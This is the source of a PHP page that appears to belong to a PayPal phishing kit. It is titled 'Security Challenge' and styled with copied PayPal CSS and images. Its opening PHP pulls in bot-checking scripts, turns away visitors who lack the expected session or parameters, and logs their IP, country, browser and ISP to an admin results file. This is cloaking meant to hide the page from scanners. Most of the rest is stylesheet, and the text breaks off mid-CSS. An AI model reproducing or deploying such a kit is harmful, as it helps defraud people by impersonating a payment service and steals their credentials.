<?php
session_start();
error_reporting(0);
include 'spox_bot.php';
include 'check.php';
if (empty($_GET['ch_id']) or empty($_GET['country']) or empty($_GET['expired']) or !isset($_SESSION['SPOX_SESSION'])) {
       text_spox("admin/result/blocked.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | Undefined Visitor\r\n");
     include'blocked.php';exit();
}
?>
<html lang="en" class=" js ">
<!--<![endif]-->
<head>
    <meta charset="utf-8">
    <title>Security Challenge</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex,nofollow">
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <style>/** method responsible for loading the background image set in CSS **/
        @-webkit-keyframes rotation {
          from {
            -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
          }
          to {
            -webkit-transform: rotate(359deg);
            transform: rotate(359deg);
          }
        }
        @-moz-keyframes rotation {
          from {
            -moz-transform: rotate(0deg);
            transform: rotate(0deg);
          }
          to {
            -moz-transform: rotate(359deg);
            transform: rotate(359deg);
          }
        }
        @-o-keyframes rotation {
          from {
            -o-transform: rotate(0deg);
            transform: rotate(0deg);
          }
          to {
            -o-transform: rotate(359deg);
            transform: rotate(359deg);
          }
        }
        @keyframes rotation {
          from {
            transform: rotate(0deg);
          }
          to {
            transform: rotate(359deg);
          }
        }
        /* Lib */
        #main .headContainer {
          margin-bottom: 10px;
        }
        /* mobile ---- */
        @media all and (max-width: 767px) {
          * {
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
          }
          header.headContainer {
            width: 100%;
          }
        }
        /* Animator setting */
        @keyframes rotation {
          from {
            transform: rotate(0deg);
          }
          to {
            transform: rotate(359deg);
          }
        }
        @-webkit-keyframes rotation {
          from {
            -webkit-transform: rotate(0deg);
          }
          to {
            -webkit-transform: rotate(359deg);
          }
        }
        @-moz-keyframes rotation {
          from {
            -moz-transform: rotate(0deg);
          }
          to {
            -moz-transform: rotate(359deg);
          }
        }
        @-o-keyframes rotation {
          from {
            -o-transform: rotate(0deg);
          }
          to {
            -o-transform: rotate(359deg);
          }
        }
        /**
         * @fileOverview account page.
         * @old_name paypal.less
         * @tested ?
         */
        html {
          background-color: #ffffff;
          min-height: 100%;
        }
        body {
          min-height: 100%;
          margin: 0;
          padding: 0;
          color: #2c2e2f;
          font-family: Helvetica, Arial, sans-serif;
          font-size: 93.75%;
          /* Base font size is 15px */
          -webkit-font-smoothing: antialiased;
          -webkit-backface-visibility: hidden;
        }
        ul,
        ol,
        li {
          margin: 0;
          padding: 0;
        }
        p {
          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
          color: #2c2e2f;
        }
        h1 {
          margin: 0;
          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
          font-size: 1.86666667em;
          font-weight: 300;
          color: #2c2e2f;
        }
        h2 {
          margin: 0;
          padding: 0;
          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
          font-size: 1.4em;
          font-weight: 300;
          color: #2c2e2f;
        }
        img {
          border: 0;
        }
        a,
        a:link,
        a:visited {
          color: #0070ba;
          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
          font-weight: normal;
          text-decoration: none;
          -webkit-transition: color 0.2s ease-out;
          -moz-transition: color 0.2s ease-out;
          -o-transition: color 0.2s ease-out;
          -ms-transition: color 0.2s ease-out;
          transition: color 0.2s ease-out;
        }
        a:hover,
        a:focus {
          text-decoration: underline;
          outline: none;
        }
        .inline,
        .inlineLink:link,
        .inlineLink:visited {
          font-weight: bold;
        }
        .no-js body {
          display: block !important;
        }
        .nonjsAlert {
          margin: 0;
          padding: .5em;
          border-top: 1px solid #990000;
          border-bottom: 1px solid #990000;
          background-color: #ffff99;
          color: #990000;
          text-align: center;
        }
        .imageLink:focus {
          -webkit-box-shadow: 0 0 1px 1px #666666;
          -moz-box-shadow: 0 0 1px 1px #666666;
          box-shadow: 0 0 1px 1px #666666;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
        }
        .lower-than-ie9 .imageLink:focus {
          outline: 1px solid #666;
        }
        .accessAid {
          position: absolute !important;
          clip: rect(1px 1px 1px 1px);
          /* IE6, IE7 */
          clip: rect(1px, 1px, 1px, 1px);
          padding: 0 !important;
          border: 0 !important;
          height: 1px !important;
          width: 1px !important;
          overflow: hidden;
        }
        .clearfix {
          zoom: 1;
        }
        .clearfix:before,
        .clearfix:after {
          display: table;
          content: "";
        }
        .clearfix:after {
          clear: both;
        }
        .hide {
          display: none;
        }
        .underlay {
          content: "";
          height: 100%;
          width: 100%;
          margin: 0;
          padding: 0;
          position: fixed;
          top: 0;
          left: 0;
          background: #999999;
          opacity: 0.6;
          z-index: 5;
        }
        /** Style for supressing the X, eye symbol for password field mark in IE 10 and above **/
        input::-ms-clear,
        input::-ms-reveal {
          display: none;
          width: 0;
          height: 0;
        }
        /**
        * Shared properties between pages such as 'login', 'atoVerification', 'atoTimeout', 'atoDecline'. Includes header, body container with gray box and margins, responsiveness.
        */
        * {
          -webkit-box-sizing: border-box;
          -moz-box-sizing: border-box;
          box-sizing: border-box;
        }
        .corral {
          margin: 0 auto;
          width: 460px;
        }
        .contentContainer {
          position: relative;
          margin: 130px auto 0;
          padding: 30px 10% 50px;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
        }
        .contentContainer .modal-overlay {
          content: "";
          height: 100%;
          width: 100%;
          position: absolute;
          top: 0;
          left: 0;
          background: #FAFAFA;
          z-index: 16;
          opacity: 1;
        }
        .contentContainer .modal-animate {
          z-index: 17;
          position: absolute;
          width: 100px;
          margin: 0 auto;
          top: 120px;
          left: 38%;
          min-height: 100px;
          overflow: hidden;
        }
        .contentContainer .rotate {
          content: "";
          height: 30px;
          width: 30px;
          position: absolute;
          left: 50%;
          top: 50%;
          z-index: 6;
          margin: -15px auto auto -15px;
          -webkit-animation: rotation .7s infinite linear;
          -moz-animation: rotation .7s infinite linear;
          -o-animation: rotation .7s infinite linear;
          animation: rotation .7s infinite linear;
          border-left: 8px solid rgba(0, 0, 0, 0.2);
          border-right: 8px solid rgba(0, 0, 0, 0.2);
          border-bottom: 8px solid rgba(0, 0, 0, 0.2);
          border-top: 8px solid #2180c0;
          border-radius: 100%;
          position: fixed;
          top: 43%;
          right: 0;
          bottom: 0;
          left: 0;
          z-index: 200;
          margin: 0;
          text-align: center;
        }
        .contentContainerLean {
          text-align: center;
        }
        .contentContainerTall {
          margin-top: 170px;
        }
        .contentContainerXhr {
          position: relative;
          margin: 50px auto 0;
          padding: 20px 10% 20px;
          background-color: #fff;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
        }
        /* Password recovery specific style */
        .pwr-modal {
          display: none;
        }
        #dialogHeader {
          box-sizing: initial;
        }
        #forgot-password-modal iframe {
          border: none;
          width: 100%;
          min-height: 300px;
        }
        .response500 {
          text-align: center;
        }
        .response500 .headerText {
          line-height: normal;
        }
        /* start atoVerification properties that could be used commonly */
        .left {
          text-align: left;
        }
        .bold {
          font-weight: bold;
          margin-bottom: 0px;
        }
        .largetext {
          font-size: 30px;
          margin-top: 0px;
        }
        .countdown {
          font-size: 38px;
          margin-top: 0px;
        }
        .paypal-logo {
          margin: 0 auto 30px;
          text-indent: -9999em;
          direction: ltr;
        }
        .paypal-logo-monogram {
          background: transparent url("https://www.paypalobjects.com/images/shared/momgram@2x.png") top center no-repeat;
          background-size: 30px;
          height: 36px;
        }
        .lower-than-ie9 .paypal-logo-monogram {
          height: 72px;
        }
        .spinner,
        .mask {
          position: fixed;
          top: 43%;
          right: 0;
          bottom: 0;
          left: 0;
          z-index: 200;
          margin: 0;
          text-align: center;
        }
        .spinner:after,
        .mask:after {
          content: '';
          position: fixed;
          z-index: -1;
          top: 0;
          right: 0;
          bottom: 0;
          left: 0;
          background: #ffffff;
          -moz-opacity: 0.9;
          -khtml-opacity: 0.9;
          -webkit-opacity: 0.9;
          opacity: 0.9;
          -ms-filter: progid:DXImageTransform.Microsoft.Alpha(opacity=90);
          filter: alpha(opacity=90);
        }
        .mask:after {
          -moz-opacity: 1;
          -khtml-opacity: 1;
          -webkit-opacity: 1;
          opacity: 1;
          -ms-filter: progid:DXImageTransform.Microsoft.Alpha(opacity=100);
          filter: alpha(opacity=100);
        }
        .spinner:before {
          content: "";
          display: block;
          margin: 0 auto 10px;
          text-align: center;
          width: 34px;
          height: 34px;
          border-left: 8px solid #000000;
          border-left: 8px solid rgba(0, 0, 0, 0.2);
          border-right: 8px solid #000000;
          border-right: 8px solid rgba(0, 0, 0, 0.2);
          border-bottom: 8px solid #000000;
          border-bottom: 8px solid rgba(0, 0, 0, 0.2);
          border-top: 8px solid #2180c0;
          border-radius: 50px;
          -webkit-animation: rotation .7s infinite linear;
          -moz-animation: rotation .7s infinite linear;
          -o-animation: rotation .7s infinite linear;
          animation: rotation .7s infinite linear;
        }
        .lower-than-ie9 .spinner:before,
        .lower-than-ie10 .spinner:before {
          background: transparent url("https://www.paypalobjects.com/webstatic/checkout/hermes/icon_loader_med.gif") top center no-repeat;
          border: none;
          width: 50px;
          height: 50px;
        }
        /* end of atoVerification properties that could be used commonly */
        /* mobile ---- */
        @media all and (max-width: 767px) {
          .contentContainer {
            margin-top: 30px;
            padding: 0px;
            width: 100%;
          }
          .contentContainerXhr {
            margin-top: 30px;
            padding: 0 10% 30px;
            width: 100%;
          }
          .corral {
            width: 100%;
          }
        }
        a.button,
        a.button:link,
        a.button:visited,
        .button,
        button {
          width: 100%;
          height: 45px;
          padding-top: 4px;
          border: 0;
          display: block;
          background: #0070ba;
          -webkit-box-shadow: none;
          -moz-box-shadow: none;
          box-shadow: none;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          -webkit-box-sizing: border-box;
          -moz-box-sizing: border-box;
          box-sizing: border-box;
          cursor: pointer;
          -webkit-appearance: none;
          -moz-webkit-appearance: none;
          -ms-webkit-appearance: none;
          -o-webkit-appearance: none;
          webkit-appearance: none;
          -webkit-tap-highlight-color: transparent;
          color: #ffffff;
          font-size: 1em;
          text-align: center;
          font-weight: bold;
          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
          text-shadow: none;
          text-decoration: none;
          -webkit-transition: background-color 0.4s ease-out;
          -moz-transition: background-color 0.4s ease-out;
          -o-transition: background-color 0.4s ease-out;
          -ms-transition: background-color 0.4s ease-out;
          transition: background-color 0.4s ease-out;
        }
        a.button:hover,
        a.button:link:hover,
        a.button:visited:hover,
        .button:hover,
        button:hover {
          background: #005ea6;
          outline: none;
        }
        a.button:focus,
        a.button:link:focus,
        a.button:visited:focus,
        .button:focus,
        button:focus {
          background: #005ea6;
          text-decoration: underline;
          outline: none;
        }
        a.button.active,
        a.button:link.active,
        a.button:visited.active,
        .button.active,
        button.active,
        a.button:active,
        a.button:link:active,
        a.button:visited:active,
        .button:active,
        button:active {
          background: #00598e;
        }
        a.button.secondary,
        a.button:link.secondary,
        a.button:visited.secondary,
        .button.secondary,
        button.secondary {
          background: #E1E7EB;
          color: #2C2E2F;
        }
        a.button.secondary:hover,
        a.button:link.secondary:hover,
        a.button:visited.secondary:hover,
        .button.secondary:hover,
        button.secondary:hover,
        a.button.secondary:focus,
        a.button:link.secondary:focus,
        a.button:visited.secondary:focus,
        .button.secondary:focus,
        button.secondary:focus {
          background: #d2dbe1;
        }
        a.button,
        a.button:link,
        a.button:visited {
          padding-top: 14px;
        }
        button.asLink {
          display: inline;
          width: auto;
          padding: 0;
          background: none;
          color: #0070ba;
          font-weight: normal;
        }
        .actionsSpaced {
          margin-top: 30px;
        }
        /**
         * @fileOverview textInput styles.
         * @name textInput.less
         * @tested ?
         */
        .fieldLabel {
          position: absolute;
          color: #6c7378;
          clip: rect(1px 1px 1px 1px);
          /* IE6, IE7 */
          clip: rect(1px, 1px, 1px, 1px);
          padding: 0;
          border: 0;
          height: 1px;
          width: 1px;
          overflow: hidden;
        }
        .fieldWrapper {
          position: relative;
          z-index: 2;
          width: 100%;
        }
        .errorMessage {
          position: absolute;
          top: 1px;
          left: 0;
          z-index: 1;
          width: 100%;
          padding: 10px;
          height: 0;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          background: #c72f38;
          color: #fff;
          transition: all 0.3s ease-out;
        }
        .errorMessage p {
          margin: 0;
          color: #fff;
        }
        .errorMessage.show {
          top: 41px;
          height: auto;
          -webkit-border-radius: 0;
          -moz-border-radius: 0;
          -khtml-border-radius: 0;
          border-radius: 0;
          text-align: left;
        }
        .textInput {
          position: relative;
          min-height: 45px;
          margin: 0 0 15px 0;
          /* For IE 11: the errorMessage div can be seen from under the input div, so using this to hide it */
          /* Hide spinner in inputs with type=number in Chrome/FF/Safari */
        }
        .textInput .fieldWrapper:before {
          content: "";
          display: block;
          z-index: -1;
          position: absolute;
          top: 0;
          width: 100%;
          height: 40px;
          background-color: #ffffff;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
        }
        .textInput input:-moz-placeholder {
          color: #999999;
        }
        .textInput input::-moz-placeholder {
          color: #999999;
        }
        .textInput input:-ms-input-placeholder {
          color: #999999;
        }
        .textInput input::-webkit-input-placeholder {
          color: #999999;
        }
        .textInput.hasError input {
          border: 1px solid #c72f38;
          background-image: url(https://www.paypalobjects.com/webstatic/i/consumer/onboarding/sprite_form_2x.png);
          background-position: top -409px right 10px;
          background-size: 25px;
          background-repeat: no-repeat;
        }
        .lower-than-ie9 .textInput.hasError input {
          background-position: right -804px;
        }
        .textInput.hasError input:-moz-placeholder {
          color: #c72f38;
        }
        .textInput.hasError input::-moz-placeholder {
          color: #c72f38;
        }
        .textInput.hasError input:-ms-input-placeholder {
          color: #c72f38;
        }
        .textInput.hasError input::-webkit-input-placeholder {
          color: #c72f38;
        }
        .textInput.hasError input:focus {
          border: 1px solid #c72f38;
        }
        .textInput.hasError input:focus:-moz-placeholder {
          color: #999999;
        }
        .textInput.hasError input:focus::-moz-placeholder {
          color: #999999;
        }
        .textInput.hasError input:focus:-ms-input-placeholder {
          color: #999999;
        }
        .textInput.hasError input:focus::-webkit-input-placeholder {
          color: #999999;
        }
        .textInput input,
        .textInput textarea {
          height: 44px;
          width: 100%;
          padding: 0 24px 0 12px;
          border: 1px solid #aaaaaa;
          outline: 0;
          background: #ffffff;
          text-overflow: ellipsis;
          -webkit-box-sizing: border-box;
          -moz-box-sizing: border-box;
          box-sizing: border-box;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          -webkit-box-shadow: none;
          -moz-box-shadow: none;
          box-shadow: none;
          color: #000000;
          font-size: 16px;
          font-family: Helvetica, Arial, sans-serif;
          font-weight: normal;
        }
        .textInput input:focus,
        .textInput textarea:focus {
          border: 1px solid #0070ba;
          -webkit-box-shadow: none;
          -moz-box-shadow: none;
          box-shadow: none;
          background-color: #ffffff;
        }
        .textInput textarea {
          padding-top: 12px;
          padding-right: 0;
          height: 100%;
          overflow: auto;
        }
        .textInput input:not([type=submit]):not([type=radio]):not([type=checkbox]) {
          -webkit-background-clip: padding-box;
          -moz-background-clip: padding-box;
          background-clip: padding-box;
          -webkit-transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
          -moz-transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
          -o-transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
          -ms-transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
          transition: border 0.2s ease-in-out, background-color 0.2s ease-in-out;
        }
        .textInput .tickmark {
          background: url("sprite_form.png") no-repeat;
        }
        @media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and (min--moz-device-pixel-ratio: 2), only screen and (-o-min-device-pixel-ratio: 2/1), only screen and (min-device-pixel-ratio: 2) {
          .textInput .tickmark {
            background: url("sprite_form_2x.png") no-repeat;
            background-size: 25px;
          }
        }
        .textInput .tickmark {
          width: 35px;
          height: 35px;
          margin-top: 2px;
          right: 5px;
          float: right;
          position: absolute;
          z-index: 3;
          text-align: center;
          cursor: pointer;
          background-position: 0 69%;
        }
        .textInput input[type=number]::-webkit-inner-spin-button,
        .textInput input[type=number]::-webkit-outer-spin-button {
          -webkit-appearance: none;
          margin: 0;
        }
        .textInput input[type=number] {
          -moz-appearance: textfield;
        }
        /* LAP - large */
        .js .lap .textInput,
        .js div.lap.textInput {
          padding: 0;
          position: relative;
        }
        .js .lap .textInput label,
        .js div.lap.textInput label {
          position: absolute;
          left: 12px;
          z-index: 1;
          color: #666666;
          cursor: text;
        }
        .js .lap .textInput label.focus,
        .js div.lap.textInput label.focus,
        .js div.lap.textInput label.focus span.optional,
        .js .lap .textInput label.focus span.optional {
          color: #b3b3b3;
        }
        /* LAP - medium */
        .js .lap .textInput.medium,
        .js div.lap.textInput.medium {
          padding: 0;
          position: relative;
        }
        .js .lap .textInput.medium label.focus,
        .js .formMedium div.lap.textInput.medium label.focus {
          color: #b3b3b3;
        }
        .js .lap .textInput.medium label,
        .js div.lap.textInput.medium label {
          position: absolute;
          left: 12px;
          z-index: 1;
          color: #666666;
        }
        .groupFields {
          clear: both;
        }
        .groupFields .textInput {
          width: 48.9%;
          float: left;
        }
        .groupFields .textInput input {
          width: 100%;
        }
        .groupFields .left,
        .groupFields .middle {
          margin-right: 10px;
        }
        .groupFields .multi .left {
          width: 72.5%;
          float: left;
        }
        .groupFields .multi .right {
          width: 25%;
          float: left;
        }
        .groupFields .multi.equal .left,
        .groupFields .multi.equal .right {
          width: 48.6%;
        }
        .groupFields .reverse .right {
          width: 72.3%;
        }
        .groupFields .reverse .left {
          width: 25%;
        }
        .groupFields .multiple .left {
          width: 48.8%;
          float: left;
        }
        .groupFields .multiple .right {
          width: 25%;
          float: left;
        }
        .groupFields .multiple .middle {
          width: 21.4%;
          float: left;
        }
        .groupFields .multiple.equal .left,
        .groupFields .multiple.equal .right,
        .groupFields .multiple.equal .middle {
          width: 31.8%;
        }
        .groupFields .large {
          width: 100%;
        }
        .groupReatedFields .left {
          width: 27%;
          float: left;
        }
        .groupReatedFields .right {
          width: 73%;
          float: left;
        }
        .groupReatedFields .selectDropdown {
          border-right: 0;
          border-top-right-radius: 0;
          border-bottom-right-radius: 0;
        }
        .groupReatedFields .textInput input {
          border-top-left-radius: 0;
          border-bottom-left-radius: 0;
        }
        /** IPAD STYLING **/
        @media all and (min-width: 768px) and (max-width: 1024px) {
          .groupFields .multi.equal .left,
          .groupFields .multi.equal .right {
            width: 48.4%;
          }
        }
        @media all and (min-width: 768px) and (max-width: 1024px) and (orientation: portrait) {
          .groupFields .multi.equal .left,
          .groupFields .multi.equal .right {
            width: 48.2%;
          }
        }
        @media all and (max-width: 538px) {
          .groupFields .textInput,
          .groupFields .multi .textInput,
          .groupFields .multiple .textInput,
          .groupFields .selectDropdown,
          .groupFields .multi .selectDropdown,
          .groupFields .multiple .selectDropdown {
            width: 100%;
          }
        }
        /* mobile ---- */
        @media all and (max-width: 767px) {
          .groupFields .multi.equal .left,
          .groupFields .multi.equal .right {
            width: 48.2%;
          }
        }
        /* android specific */
        .android .textInput input:focus {
          -webkit-user-modify: read-write-plaintext-only;
        }
        /*
        Please do not make changes to this file unless it's a global change for all our customized <select> dropdowns.
        If you need to change something for your particular need, please add a class to change/override what you want.
        */
        /* Container for the customized <select> dropdown */
        .selectDropdownWrapper {
          position: relative;
          height: 44px;
          border: 1px solid #aaaaaa;
          margin-bottom: 10px;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          background-color: #ffffff;
          text-align: left;
        }
        /* Styles the <select> */
        .selectDropdownInput {
          position: relative;
          height: 44px;
          width: 100%;
          border: none;
          background: none;
          -moz-opacity: 0;
          -khtml-opacity: 0;
          -webkit-opacity: 0;
          opacity: 0;
          -ms-filter: progid:DXImageTransform.Microsoft.Alpha(opacity=0);
          filter: alpha(opacity=0);
          z-index: 1;
        }
        /* Positions the container that holds the option selected */
        .selectDropdownChoiceSelected {
          position: absolute;
          top: 0;
          left: 0;
          height: 44px;
          width: 100%;
          padding-left: 11px;
          line-height: 41px;
          font-weight: bold;
        }
        /* The open arrow for <select> element */
        .selectDropdownChoiceSelected:after {
          content: '';
          position: absolute;
          top: 12px;
          right: 15px;
          height: 8px;
          width: 8px;
          border-width: 1px;
          border-style: solid;
          border-color: #333333 #333333 #ffffff #ffffff;
          -webkit-transform: rotate(135deg);
          -moz-transform: rotate(135deg);
          -o-transform: rotate(135deg);
          -ms-transform: rotate(135deg);
          transform: rotate(135deg);
        }
        .lower-than-ie9 .selectDropdownChoiceSelected:after {
          border: 0;
          background: url('https://www.paypalobjects.com/images/shared/sprite_forms_1x.png') no-repeat -9px -1197px;
          width: 24px;
          height: 14px;
        }
        .notifications {
          /* Add this class when you want to animate the notification component. */
        }
        .notifications.animatable {
          display: none;
        }
        .notifications .notification {
          margin-top: 0;
          padding: 15px 15px 15px 44px;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          border-width: 1px;
          border-style: solid;
          text-align: left;
          font-size: 1em;
          background: url("https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png") no-repeat;
          background-size: 20px;
          /* Default is the informational message */
        }
        .notifications .notification.notification-default {
          background-color: #f7f9fa;
          background-position: left 12px top -788px;
          border-color: #afabae;
        }
        .lower-than-ie9 .notifications .notification.notification-default {
          background-position: 1% 81.5%;
        }
        .notifications .notification.notification-critical {
          background-color: #fff7f7;
          background-position: left 12px top -387px;
          border-color: #c72e2e;
        }
        .lower-than-ie9 .notifications .notification.notification-critical {
          background-position: 1% 41%;
        }
        .notifications .notification.notification-help {
          background-color: #f7fdff;
          background-position: left 12px top -588px;
          border-color: #009cde;
        }
        .lower-than-ie9 .notifications .notification.notification-help {
          background-position: 1% 61%;
        }
        .notifications .notification.notification-success {
          background-color: #f7fff7;
          background-position: left 12px top 12px;
          border-color: #1b9e1b;
        }
        .lower-than-ie9 .notifications .notification.notification-success {
          background-position: 1% 0;
        }
        .notifications .notification.notification-warning {
          background-color: #fffcf7;
          background-position: left 12px top -188px;
          border-color: #f8981f;
        }
        .lower-than-ie9 .notifications .notification.notification-warning {
          background-position: 1% 20.5%;
        }
        .deniedCaution {
          margin-bottom: 25px;
          width: 112px;
          height: 100px;
        }
        .denied {
          text-align: center;
        }
        .verification,
        .unavailable {
          text-align: left;
        }
        .mphone {
          width: 85%;
        }
        .mobileScreen {
          width: 20%;
          margin-right: 5%;
          float: left;
        }
        .callOut {
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          width: 75%;
          padding: 15px;
          position: relative;
          background: #ffffff;
          border: 2px solid #278ccd;
          font-size: 13px;
          float: left;
        }
        .callOut:before,
        .callOut:after {
          border: solid transparent;
          content: " ";
          height: 0;
          width: 0;
          position: absolute;
          pointer-events: none;
        }
        .callOut:after {
          border-right-color: #ffffff;
          border-width: 8px;
          top: 20px;
          left: -16px;
        }
        .callOut:before {
          border-right-color: #278ccd;
          border-width: 11px;
          top: 17px;
          left: -22px;
        }
        .tryAnotherClick {
          margin-top: 0;
        }
        .tryAnotherMsg {
          margin-bottom: 0;
        }
        .greyOut,
        a.greyOut:hover,
        a.greyOut:link,
        a.greyOut:visited,
        a.greyOut:focus {
          color: #dddddd;
        }
        .unavailableMessage {
          margin-bottom: 30px;
        }
        .mobileNotification {
          background: #f7f9fa;
          padding: 15px;
        }
        .captcha-overlay {
          visibility: hidden;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 9999;
          overflow: auto;
          background-color: rgba(0, 0, 0, 0.6);
        }
        .captcha-container {
          width: 100%;
          margin: 0 0 10px 0;
        }
        .captcha-container .captcha-image {
          height: 83px;
          text-align: center;
          border: 1px solid #E6E6E6;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          margin: 0 0 10px 0;
        }
        .captcha-container .captcha-image img {
          width: 100%;
          height: 81px;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
        }
        .captcha-container .captcha-inputs {
          display: table;
          width: 100%;
        }
        .captcha-container .captcha-inputs .textInput {
          display: table-cell;
          min-width: 100px;
        }
        .captcha-container .captcha-inputs .refresh,
        .captcha-container .captcha-inputs .audio {
          display: table-cell;
          vertical-align: middle;
          width: 36px;
        }
        .lower-than-ie9 .captcha-container .captcha-inputs .refresh,
        .lower-than-ie9 .captcha-container .captcha-inputs .audio,
        .lower-than-ie10 .captcha-container .captcha-inputs .refresh,
        .lower-than-ie10 .captcha-container .captcha-inputs .audio {
          vertical-align: bottom;
        }
        .captcha-container .captcha-inputs .refresh {
          padding: 0 8px;
        }
        .captcha-container .captcha-inputs .captchaPlay,
        .captcha-container .captcha-inputs .captchaRefresh {
          display: block;
          width: 36px;
          height: 36px;
        }
        .captcha-container .captcha-inputs .captchaPlay:after,
        .captcha-container .captcha-inputs .captchaRefresh:after {
          width: 36px;
          height: 36px;
        }
        .captcha-container .captcha-inputs .captchaPlay:after {
          background-position: -32px -3489px;
        }
        .captcha-container .captcha-inputs .captchaRefresh:after {
          background-position: -33px -3389px;
        }
        .buttonLight {
          border: 1px solid;
          border-color: #ddd #d9d9d9 #bdbdbd;
          background-color: #dedede;
          background: -moz-linear-gradient(center bottom, #dedede 0%, #dedede 20%, #f5f5f5 100%);
          background: -webkit-gradient(linear, left bottom, left top, color-stop(0%, #dedede), color-stop(20%, #dedede), color-stop(100%, #f5f5f5));
          /* Chrome,Safari4+ */
          background: -webkit-linear-gradient(bottom, #dedede 0%, #dedede 20%, #f5f5f5 100%);
          background: -ms-linear-gradient(bottom, #dedede 0%, #dedede 20%, #f5f5f5 100%);
          background: -o-linear-gradient(bottom, #dedede 0%, #dedede 20%, #f5f5f5 100%);
          background: linear-gradient(bottom, #dedede 0%, #dedede 20%, #f5f5f5 100%);
          text-shadow: 0 1px #efefef;
          color: #333;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          -khtml-border-radius: 5px;
          border-radius: 5px;
          -webkit-box-shadow: 0 1px #ffffff inset, 0 1px 0 rgba(255, 255, 255, 0.2);
          -moz-box-shadow: 0 1px #ffffff inset, 0 1px 0 rgba(255, 255, 255, 0.2);
          box-shadow: 0 1px #ffffff inset, 0 1px 0 rgba(255, 255, 255, 0.2);
        }
        .buttonLight:hover {
          background-color: #d1d1d1;
          background: -moz-linear-gradient(center bottom, #d1d1d1 0%, #d1d1d1 20%, #ebebeb 100%);
          background: -webkit-linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #ebebeb 100%);
          background: -webkit-gradient(linear, left bottom, left top, color-stop(0%, #d1d1d1), color-stop(20%, #d1d1d1), color-stop(100%, #ebebeb));
          /* Chrome,Safari4+ */
          background: -ms-linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #ebebeb 100%);
          background: -o-linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #ebebeb 100%);
          background: linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #ebebeb 100%);
          text-decoration: none;
          -webkit-box-shadow: 0 1px #f5f5f5 inset, 0 1px rgba(255, 255, 255, 0.2);
          -moz-box-shadow: 0 1px #f5f5f5 inset, 0 1px rgba(255, 255, 255, 0.2);
          box-shadow: 0 1px #f5f5f5 inset, 0 1px rgba(255, 255, 255, 0.2);
        }
        .buttonLight:active {
          background-color: #c8c8c8;
          border-color: #c2c2c2 #bcbcbc #adadad;
          background: -moz-linear-gradient(center bottom, #d1d1d1 0%, #d1d1d1 20%, #dedede 100%);
          background: -webkit-linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #dedede 100%);
          background: -webkit-gradient(linear, left bottom, left top, color-stop(0%, #d1d1d1), color-stop(20%, #d1d1d1), color-stop(100%, #dedede));
          /* Chrome,Safari4+ */
          background: -ms-linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #dedede 100%);
          background: -o-linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #dedede 100%);
          background: linear-gradient(bottom, #d1d1d1 0%, #d1d1d1 20%, #dedede 100%);
          -webkit-box-shadow: 0 2px 4px #999999 inset, 0 1px 0 rgba(255, 255, 255, 0.2);
          -moz-box-shadow: 0 2px 4px #999999 inset, 0 1px 0 rgba(255, 255, 255, 0.2);
          box-shadow: 0 2px 4px #999999 inset, 0 1px 0 rgba(255, 255, 255, 0.2);
        }
        .onboardingSpritePseudo:after {
          content: '';
          display: block;
          background-image: url('https://www.paypalobjects.com/webstatic/mktg/consumer/onboarding/ui-sprite.png');
          background-repeat: no-repeat;
        }
        /**
         * @fileOverview Jquery UI modal specific styles.
         * @name modal.less
         * @tested chrome, safari, ?
         */
        .ui-front {
          z-index: 100;
        }
        .ui-widget,
        .ui-widget button {
          font-family: inherit;
          font-size: inherit;
        }
        .ui-dialog {
          position: fixed;
          background: #fff;
          border-radius: 4px;
          opacity: 1;
          overflow: hidden;
          -webkit-transition: opacity 0.2s linear;
          transition: opacity 0.2s linear;
        }
        .ui-dialog .btn {
          width: 100%;
          -moz-box-sizing: border-box;
